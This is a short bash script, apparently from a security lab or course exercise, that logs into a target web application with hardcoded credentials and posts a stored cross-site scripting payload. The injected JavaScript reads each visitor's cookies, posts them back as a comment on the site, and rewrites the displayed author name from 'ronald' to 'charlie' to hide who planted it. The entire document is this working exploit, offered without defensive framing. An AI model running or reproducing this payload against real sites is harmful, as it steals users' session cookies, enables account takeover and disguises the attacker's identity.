#!/bin/bash

curl -c cookie.txt -d "username=ronald" -d "password=password123" -d "form=login" "$1/post.php" > response.txt

curl -b cookie.txt -d "title=display cookies" --data-urlencode "content=<script>if (window.location.href.indexOf('view.php') != -1) {document.getElementById('author').innerHTML = document.getElementById('author').innerHTML.replace('ronald', 'charlie');} function getID() {if (window.location.href.indexOf('view.php') == -1) return;const urlSearchParams = new URLSearchParams(window.location.search);const myParam = urlSearchParams.get('id');return myParam;} function leakCookies(postID) {var theCookies = document.cookie.split(';');var cookieString = '';for (var i = 1 ; i <= theCookies.length; i++) { cookieString += theCookies[i-1] + ' '; } var xhr = new XMLHttpRequest();var url = 'post.php';xhr.open('POST',url,true);xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');xhr.onreadystatechange = function() {if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {} }; xhr.send('comment='+cookieString+'&form=comment&parent='+postID+'&uid=7&submit=')} window.onload = function() { leakCookies(getID()); if (!window.location.hash && window.location.href.indexOf('view.php') != -1) { window.location = window.location+'#loaded'; window.location.reload();} }</script>" -d "type=1" -d "form=content" -d "submit=" "$1/post.php" >> response.txt
